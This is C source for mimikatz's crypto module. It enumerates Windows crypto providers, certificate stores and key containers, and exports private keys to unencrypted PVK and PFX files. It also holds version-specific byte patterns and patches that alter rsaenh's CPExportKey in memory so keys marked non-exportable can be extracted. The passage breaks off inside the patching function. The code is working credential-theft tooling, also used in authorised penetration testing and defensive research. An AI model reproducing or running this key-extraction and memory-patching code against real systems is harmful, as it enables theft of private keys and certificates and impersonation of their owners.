/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_crypto.h"

HMODULE
	kuhl_m_crypto_hNCrypt = NULL,
	kuhl_m_crypto_hRsaEnh = NULL;

const KUHL_M_C kuhl_m_c_crypto[] = {
	{kuhl_m_crypto_l_providers,		L"providers",		L"List cryptographic providers"},
	{kuhl_m_crypto_l_stores,		L"stores",			L"List cryptographic stores"},
	{kuhl_m_crypto_l_certificates,	L"certificates",	L"List (or export) certificates"},
	{kuhl_m_crypto_l_keys,			L"keys",			L"List (or export) keys containers"},

	{kuhl_m_crypto_p_capi,			L"capi",			L"[experimental] Patch CryptoAPI layer for easy export"},
	{kuhl_m_crypto_p_cng,			L"cng",				L"[experimental] Patch CNG service for easy export"},
};

const KUHL_M kuhl_m_crypto = {
	L"crypto", L"Crypto Module", NULL,
	ARRAYSIZE(kuhl_m_c_crypto), kuhl_m_c_crypto, kuhl_m_crypto_init, kuhl_m_crypto_clean
};

PCP_EXPORTKEY K_CPExportKey = NULL;
PNCRYPT_OPEN_STORAGE_PROVIDER K_NCryptOpenStorageProvider = NULL;
PNCRYPT_ENUM_KEYS K_NCryptEnumKeys = NULL;
PNCRYPT_OPEN_KEY K_NCryptOpenKey = NULL;
PNCRYPT_EXPORT_KEY K_NCryptExportKey = NULL;
PNCRYPT_GET_PROPERTY K_NCryptGetProperty = NULL;
PNCRYPT_FREE_BUFFER K_NCryptFreeBuffer = NULL;
PNCRYPT_FREE_OBJECT K_NCryptFreeObject = NULL;
PBCRYPT_ENUM_REGISTERED_PROVIDERS K_BCryptEnumRegisteredProviders = NULL;
PBCRYPT_FREE_BUFFER K_BCryptFreeBuffer = NULL;

NTSTATUS kuhl_m_crypto_init()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	
	if(kuhl_m_crypto_hRsaEnh = LoadLibrary(L"rsaenh"))
	{
		if(K_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hRsaEnh, "CPExportKey"))
		{
			if((MIMIKATZ_NT_MAJOR_VERSION > 5) && !kuhl_m_crypto_hNCrypt)
			{
				if(kuhl_m_crypto_hNCrypt = LoadLibrary(L"ncrypt"))
				{
					K_NCryptOpenStorageProvider = (PNCRYPT_OPEN_STORAGE_PROVIDER) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptOpenStorageProvider");
					K_NCryptEnumKeys = (PNCRYPT_ENUM_KEYS) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptEnumKeys");
					K_NCryptOpenKey = (PNCRYPT_OPEN_KEY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptOpenKey");
					K_NCryptExportKey = (PNCRYPT_EXPORT_KEY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptExportKey");
					K_NCryptGetProperty = (PNCRYPT_GET_PROPERTY) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptGetProperty");
					K_NCryptFreeBuffer = (PNCRYPT_FREE_BUFFER) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptFreeBuffer");
					K_NCryptFreeObject = (PNCRYPT_FREE_OBJECT) GetProcAddress(kuhl_m_crypto_hNCrypt, "NCryptFreeObject");
					K_BCryptEnumRegisteredProviders = (PBCRYPT_ENUM_REGISTERED_PROVIDERS) GetProcAddress(kuhl_m_crypto_hNCrypt, "BCryptEnumRegisteredProviders");
					K_BCryptFreeBuffer = (PBCRYPT_FREE_BUFFER) GetProcAddress(kuhl_m_crypto_hNCrypt, "BCryptFreeBuffer");
		
					if(K_NCryptOpenStorageProvider && K_NCryptEnumKeys && K_NCryptOpenKey && K_NCryptExportKey && K_NCryptGetProperty && K_NCryptFreeBuffer && K_NCryptFreeObject && K_BCryptEnumRegisteredProviders && K_BCryptFreeBuffer)
						status = STATUS_SUCCESS;
				}
			}
			else status = STATUS_SUCCESS;
		}
	}
	return status;
}

NTSTATUS kuhl_m_crypto_clean()
{
	if(kuhl_m_crypto_hNCrypt)
		if(FreeLibrary(kuhl_m_crypto_hNCrypt))
		{
			K_NCryptOpenStorageProvider = NULL;
			K_NCryptEnumKeys = NULL;
			K_NCryptOpenKey = NULL;
			K_NCryptExportKey = NULL;
			K_NCryptGetProperty = NULL;
			K_NCryptFreeBuffer = NULL;
			K_NCryptFreeObject = NULL;
			K_BCryptEnumRegisteredProviders = NULL;
			K_BCryptFreeBuffer = NULL;
		}
	
	if(kuhl_m_crypto_hRsaEnh)
		if(FreeLibrary(kuhl_m_crypto_hRsaEnh))
			K_CPExportKey = NULL;

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
{
	DWORD provType,tailleRequise, index = 0;
	wchar_t * monProvider;
	PCRYPT_PROVIDERS pBuffer = NULL;

	kprintf(L"\nCryptoAPI providers :\n");
	while(CryptEnumProviders(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
				kprintf(L"%2u. %s\n", index, monProvider);
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviders");

	if(kuhl_m_crypto_hNCrypt)
	{
		kprintf(L"\nCNG providers :\n");
		if(NT_SUCCESS(K_BCryptEnumRegisteredProviders(&tailleRequise, &pBuffer)))
		{
			for(index = 0; index < pBuffer->cProviders; index++)
				kprintf(L"%2u. %s\n", index, pBuffer->rgpszProviders[index]);
			K_BCryptFreeBuffer(pBuffer);
		}
		else PRINT_ERROR_AUTO(L"BCryptEnumRegisteredProviders");
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_stores(int argc, wchar_t * argv[])
{
	DWORD dwSystemStore, nbStore = 0;
	PCWCHAR szSystemStore;
	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kprintf(L"Asking for System Store \'%s\' (0x%08x)\n", szSystemStore, dwSystemStore);

	if(!CertEnumSystemStore(dwSystemStore, NULL, &nbStore, kuhl_m_crypto_l_stores_enumCallback_print))
		PRINT_ERROR_AUTO(L"CertEnumSystemStore");

	return STATUS_SUCCESS;
}

BOOL WINAPI kuhl_m_crypto_l_stores_enumCallback_print(const void *pvSystemStore, DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved, void *pvArg)
{
	kprintf(L"%2u. %s\n", (*((DWORD *) pvArg))++, (wchar_t *) pvSystemStore);
	return TRUE;
}

const DWORD nameSrc[] = {CERT_NAME_FRIENDLY_DISPLAY_TYPE, CERT_NAME_DNS_TYPE, CERT_NAME_EMAIL_TYPE, CERT_NAME_UPN_TYPE, CERT_NAME_URL_TYPE};
NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
{
	HCERTSTORE hCertificateStore;
	PCCERT_CONTEXT pCertContext;
	DWORD i, j, dwSizeNeeded, keySpec;
	wchar_t *certName;
	PCRYPT_KEY_PROV_INFO pBuffer;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv;
	HCRYPTKEY maCle;
	BOOL keyToFree;

	PCWCHAR szSystemStore, szStore;
	DWORD dwSystemStore = 0;

	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"My");

	kprintf(L" * System Store  : \'%s\' (0x%08x)\n"
			L" * Store         : \'%s\'\n\n",
			szSystemStore, dwSystemStore,
			szStore);

	if(hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, dwSystemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, szStore))
	{
		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++)
		{
			for(j = 0; j < ARRAYSIZE(nameSrc); j++)
			{
				dwSizeNeeded = CertGetNameString(pCertContext, nameSrc[j], 0, NULL, NULL, 0);
				if(dwSizeNeeded > 0)
				{
					if(certName = (wchar_t *) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
					{
						if(CertGetNameString(pCertContext, nameSrc[j], 0, NULL, certName, dwSizeNeeded) == dwSizeNeeded)
						{
							kprintf(L"%2u. %s\n", i, certName);

							dwSizeNeeded = 0;
							if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
							{
								if(pBuffer = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwSizeNeeded))
								{
									if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
									{
										kprintf(
											L"\tKey Container  : %s\n"
											L"\tProvider       : %s\n",
											(pBuffer->pwszContainerName ? pBuffer->pwszContainerName : L"(null)"),
											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"));
										
										if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &keyToFree))
										{
											kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);

											if(keySpec != CERT_NCRYPT_KEY_SPEC)
											{
												if(CryptGetUserKey(monProv, keySpec, &maCle))
												{
													kuhl_m_crypto_printKeyInfos(0, maCle);
													CryptDestroyKey(maCle);
												}
												else PRINT_ERROR_AUTO(L"CryptGetUserKey");

												if(keyToFree)
													CryptReleaseContext(monProv, 0);
											}
											else if(kuhl_m_crypto_hNCrypt)
											{
												kuhl_m_crypto_printKeyInfos(monProv, 0);
												if(keyToFree)
													K_NCryptFreeObject(monProv);
											}
											else PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");

										} else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
									} else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
								}
								LocalFree(pBuffer);
								if(!export)
									kprintf(L"\n");
							}

							if(export)
								kuhl_m_crypto_exportCert(pCertContext, (BOOL) dwSizeNeeded, szSystemStore, szStore, i, certName);

						} else PRINT_ERROR_AUTO(L"CertGetNameString");
						LocalFree(certName);
					}
					break;
				} else PRINT_ERROR_AUTO(L"CertGetNameString (for len)");	
			}
		}
		CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
	} else PRINT_ERROR_AUTO(L"CertOpenStore");

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[])
{
	HCRYPTPROV hCryptProv;
	DWORD i, dwSizeNeeded, ks, CRYPT_first_next = CRYPT_FIRST;
	BOOL success;
	char * aContainerName;
	wchar_t * containerName;
	HCRYPTPROV hCryptKeyProv;
	HCRYPTKEY hCapiKey;

	NCRYPT_PROV_HANDLE hProvider;
	NCryptKeyName * pKeyName;
	PVOID pEnumState = NULL;
	SECURITY_STATUS retour;
	NCRYPT_KEY_HANDLE hCngKey;
	
	PCWCHAR szProvider, pProvider, szProviderType, szStore, szCngProvider/*, pCngProvider*/;
	DWORD dwProviderType, dwFlags = 0;
	
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	
	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, L"MS_ENHANCED_PROV");
	if(!(pProvider = kull_m_crypto_provider_to_realname(szProvider)))
		pProvider = szProvider;
	
	kull_m_string_args_byName(argc, argv, L"providertype", &szProviderType, L"PROV_RSA_FULL");
	if(!(dwProviderType = kull_m_crypto_provider_type_to_dword(szProviderType)))
		dwProviderType = wcstoul(szProviderType, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		dwFlags = CRYPT_MACHINE_KEYSET; // same as NCRYPT_MACHINE_KEY_FLAG :)
	szStore = dwFlags ? L"machine" : L"user";
	
	kull_m_string_args_byName(argc, argv, L"cngprovider", &szCngProvider, MS_KEY_STORAGE_PROVIDER);

	kprintf(L" * Store         : \'%s\'\n"	
			L" * Provider      : \'%s\' (\'%s\')\n"
			L" * Provider type : \'%s\' (%u)\n"
			L" * CNG Provider  : \'%s\'\n",
			szStore,
			szProvider, pProvider,
			szProviderType, dwProviderType,
			szCngProvider);

	kprintf(L"\nCryptoAPI keys :\n");
	if(CryptAcquireContext(&hCryptProv, NULL, pProvider, dwProviderType, CRYPT_VERIFYCONTEXT | dwFlags))
	{
		success = CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, NULL, &dwSizeNeeded, CRYPT_first_next);
		if(aContainerName = (char *) LocalAlloc(LPTR, dwSizeNeeded))
		{
			i = 0;
			while(success)
			{
				if(success = (CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, (BYTE *) aContainerName, &dwSizeNeeded, CRYPT_first_next)))
				{
					if(containerName = kull_m_string_qad_ansi_to_unicode(aContainerName))
					{
						kprintf(L"\n%2u. %s\n", i,  containerName);
						if(CryptAcquireContext(&hCryptKeyProv, containerName, pProvider, dwProviderType, dwFlags))
						{
							for(ks = AT_KEYEXCHANGE, hCapiKey = 0; (ks <= AT_SIGNATURE) && !CryptGetUserKey(hCryptKeyProv, ks, &hCapiKey); ks++);
							if(hCapiKey)
							{
								kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(ks), ks);
								kuhl_m_crypto_printKeyInfos(0, hCapiKey);
								if(export)
									kuhl_m_crypto_exportKeyToFile(0, hCapiKey, ks, szStore, i, containerName);
								CryptDestroyKey(hCapiKey);
							}
							else PRINT_ERROR_AUTO(L"CryptGetUserKey");
						}
						LocalFree(containerName);
					}
				}
				CRYPT_first_next = CRYPT_NEXT;
				i++;
			}
			if(GetLastError() != ERROR_NO_MORE_ITEMS)
				PRINT_ERROR_AUTO(L"CryptGetProvParam");

			CryptReleaseContext(hCryptProv, 0);
			LocalFree(aContainerName);
		}
	}

	if(kuhl_m_crypto_hNCrypt)
	{
		kprintf(L"\nCNG keys :\n");

		if(NT_SUCCESS(retour = K_NCryptOpenStorageProvider(&hProvider, szCngProvider, 0)))
		{
			i = 0;
			while(NT_SUCCESS(retour = K_NCryptEnumKeys(hProvider, NULL, &pKeyName, &pEnumState, dwFlags)))
			{
				kprintf(L"\n%2u. %s\n", i,  pKeyName->pszName);

				if(NT_SUCCESS(retour = K_NCryptOpenKey(hProvider, &hCngKey, pKeyName->pszName, 0, dwFlags)))
				{
					kuhl_m_crypto_printKeyInfos(hCngKey, 0);
					if(export)
						kuhl_m_crypto_exportKeyToFile(hCngKey, 0, AT_KEYEXCHANGE, szStore, i, pKeyName->pszName);
					K_NCryptFreeObject(hCngKey);
				}
				else PRINT_ERROR(L"NCryptOpenKey %08x\n", retour);

				K_NCryptFreeBuffer(pKeyName);
				i++;
			}
			if(retour != NTE_NO_MORE_ITEMS)
				PRINT_ERROR(L"NCryptEnumKeys %08x\n", retour);

			if(pEnumState)
				K_NCryptFreeBuffer(pEnumState);
			K_NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider %08x\n", retour);
	}

	return STATUS_SUCCESS;
}

void kuhl_m_crypto_printKeyInfos(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv, HCRYPTKEY maCle)
{
	BOOL isExportable, keyOperation = FALSE;
	DWORD keySize, dwSizeNeeded;
	if(monProv)
	{
		keyOperation = NT_SUCCESS(K_NCryptGetProperty(monProv, NCRYPT_EXPORT_POLICY_PROPERTY, (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));
		isExportable = (keySize & NCRYPT_ALLOW_EXPORT_FLAG);
		keyOperation &= NT_SUCCESS(K_NCryptGetProperty(monProv, NCRYPT_LENGTH_PROPERTY,  (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));

		if(!keyOperation)
			PRINT_ERROR_AUTO(L"NCryptGetProperty");
	}
	else if(maCle)
	{
		dwSizeNeeded = sizeof(DWORD);
		keyOperation = CryptGetKeyParam(maCle, KP_PERMISSIONS, (BYTE *) &keySize, &dwSizeNeeded, 0);
		isExportable = (keySize & CRYPT_EXPORT);

		dwSizeNeeded = sizeof(DWORD);
		keyOperation &= CryptGetKeyParam(maCle, KP_KEYLEN, (BYTE *) &keySize, &dwSizeNeeded, 0);

		if(!keyOperation)
			PRINT_ERROR_AUTO(L"CryptGetKeyParam");
	}

	if(keyOperation)
		kprintf(
		L"\tExportable key : %s\n"
		L"\tKey size       : %u\n",
		(isExportable ? L"YES" : L"NO"), keySize);
}

void kuhl_m_crypto_exportKeyToFile(NCRYPT_KEY_HANDLE hCngKey, HCRYPTKEY hCapiKey, DWORD keySpec, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	BOOL isExported = FALSE;
	DWORD szExport, szPVK;
	PBYTE pExport = NULL;
	SECURITY_STATUS nCryptReturn;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, 0};
	PCWCHAR provType = hCngKey ? L"cng" : L"capi";
	PWCHAR filenamebuffer;

	if(filenamebuffer = kuhl_m_crypto_generateFileName(store, provType, index, name, L"pvk"))
	{
		if(hCapiKey)
		{
			if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &szExport))
			{
				szPVK = szExport + sizeof(PVK_FILE_HDR);
				if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
				{
					if(!CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, pExport + sizeof(PVK_FILE_HDR), &szExport))
						pExport = (PBYTE) LocalFree(pExport);
				}
			}
		}
		else if(hCngKey)
		{
			nCryptReturn = K_NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, NULL, 0, &szExport, 0);
			if(nCryptReturn == ERROR_SUCCESS)
			{
				szPVK = szExport + sizeof(PVK_FILE_HDR);
				if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
				{
					nCryptReturn = K_NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, pExport + sizeof(PVK_FILE_HDR), szExport, &szExport, 0);
					if(nCryptReturn != ERROR_SUCCESS)
						pExport = (PBYTE) LocalFree(pExport);
				}
			}
			SetLastError(nCryptReturn);
		}

		if(pExport)
		{
			pvkHeader.cbPvk = szExport;
			RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
			isExported = kull_m_file_writeData(filenamebuffer, pExport, szPVK);
			LocalFree(pExport);
		}

		kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", filenamebuffer);
		else
			PRINT_ERROR_AUTO(L"Export / CreateFile");
	}
	else
		PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
}

void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, const wchar_t * systemStore, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	wchar_t *fileNameBuffer;
	BOOL isExported;
	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 
	PCCERT_CONTEXT  pCertContextCopy = NULL;
	CRYPT_DATA_BLOB bDataBlob = {0, NULL};

	if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"der"))
	{
		isExported = kull_m_file_writeData(fileNameBuffer, pCertificate->pbCertEncoded, pCertificate->cbCertEncoded);
		kprintf(L"\tPublic export  : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", fileNameBuffer);
		else PRINT_ERROR_AUTO(L"CreateFile");
		LocalFree(fileNameBuffer);
	}
	else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	
	if(havePrivateKey)
	{
		if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"pfx"))
		{
			isExported = FALSE;
			if(CertAddCertificateContextToStore(hTempStore, pCertificate, CERT_STORE_ADD_NEW, &pCertContextCopy))
			{
				isExported = kuhl_m_crypto_exportPfx(hTempStore, fileNameBuffer);
				CertFreeCertificateContext(pCertContextCopy);
			}
			kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
			if(isExported)
				kprintf(L"\'%s\'\n", fileNameBuffer);
			else PRINT_ERROR_AUTO(L"Export / CreateFile");
			LocalFree(fileNameBuffer);
		}
		else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	}
	kprintf(L"\n");
	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
}

BOOL kuhl_m_crypto_exportPfx(HCERTSTORE hStore, LPCWSTR filename)
{
	BOOL isExported = FALSE;
	CRYPT_DATA_BLOB bDataBlob = {0, NULL};
	if(PFXExportCertStoreEx(hStore, &bDataBlob, MIMIKATZ, NULL, EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY))
	{
		if(bDataBlob.pbData = (BYTE *) LocalAlloc(LPTR, bDataBlob.cbData))
		{
			if(PFXExportCertStoreEx(hStore, &bDataBlob, MIMIKATZ, NULL, EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY))
				isExported = kull_m_file_writeData(filename, bDataBlob.pbData, bDataBlob.cbData);
			LocalFree(bDataBlob.pbData);
		}
	}
	if(!isExported)
		PRINT_ERROR_AUTO(L"PFXExportCertStoreEx");
	return isExported;
}

BOOL kuhl_m_crypto_DerAndKeyToPfx(LPCVOID der, DWORD derLen, LPCVOID key, DWORD keyLen, BOOL isPvk, LPCWSTR filename) // no PVK support at this time
{
	BOOL isExported = FALSE;
	CRYPT_KEY_PROV_INFO infos = {NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0, 0, NULL, AT_KEYEXCHANGE};
	HCRYPTPROV hCryptProv;
	HCRYPTKEY hCryptKey;
	PCCERT_CONTEXT pCertContext;
	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 			

	if(infos.pwszContainerName = kull_m_string_getRandomGUID())
	{
		if(CertAddEncodedCertificateToStore(hTempStore, X509_ASN_ENCODING, (LPCBYTE) der, derLen, CERT_STORE_ADD_NEW, &pCertContext))
		{
			if(CryptAcquireContext(&hCryptProv, infos.pwszContainerName, infos.pwszProvName, infos.dwProvType, CRYPT_NEWKEYSET))
			{
				if(CryptImportKey(hCryptProv, (LPCBYTE) key,  keyLen, 0, CRYPT_EXPORTABLE, &hCryptKey))
				{
					if(CertSetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, 0, (LPCVOID) &infos))
						isExported = kuhl_m_crypto_exportPfx(hTempStore, filename);
					CryptDestroyKey(hCryptKey);
				}
				else PRINT_ERROR_AUTO(L"CryptImportKey");
				CryptReleaseContext(hCryptProv, 0);
				if(!CryptAcquireContext(&hCryptProv, infos.pwszContainerName, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET))
					PRINT_ERROR(L"Unable to delete temp keyset %s\n", infos.pwszContainerName);
			}
			else PRINT_ERROR_AUTO(L"CryptAcquireContext");
			CertFreeCertificateContext(pCertContext);
		}
	
		else PRINT_ERROR_AUTO(L"CertAddEncodedCertificateToStore");
		LocalFree(infos.pwszContainerName);
	}
	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
	return isExported;
}

wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext)
{
	wchar_t * buffer;
	size_t charCount = wcslen(term0) + 1 + wcslen(term1) + 1 + 10 + 1 + wcslen(name) + 1 + wcslen(ext) + 1;

	if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%s_%s_%u_%s.%s", term0, term1, index, name, ext) == -1)
			buffer = (wchar_t *) LocalFree(buffer);
		else
			kull_m_file_cleanFilename(buffer);
	}
	return buffer;
}

BYTE PATC_WIN5_CPExportKey_EXPORT[]	= {0xeb};
BYTE PATC_W6AL_CPExportKey_EXPORT[]	= {0x90, 0xe9};
#ifdef _M_X64
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x0c, 0x0e, 0x72};
BYTE PTRN_W6AL_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x0c, 0x0e, 0x0f, 0x82};
BYTE PTRN_WIN8_CPExportKey_4000[]	= {0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-4}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W6AL_CPExportKey_4001),	PTRN_W6AL_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{0, NULL}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{0, NULL}, { 2}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_CPExportKey_4000),	PTRN_WIN8_CPExportKey_4000},	{0, NULL}, { 5}},
};
#elif defined _M_IX86
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x09, 0x40, 0x0f, 0x84};
BYTE PTRN_WI60_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WI60_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4001),	PTRN_WI60_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4001),	PTRN_WIN6_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{0, NULL}, {-7}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4000),	PTRN_WI60_CPExportKey_4000},	{0, NULL}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{0, NULL}, { 5}},
};
#endif
NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
{
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
	KULL_M_MEMORY_ADDRESS
		aPattern4000Memory = {NULL, &hLocalMemory},
		aPattern4001Memory = {NULL, &hLocalMemory},
		aPatchMemory = {NULL, &hLocalMemory};
	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &hLocalMemory}, 0}, NULL};
	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
	
	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
	if(currentReference4001 && currentReference4000)
	{
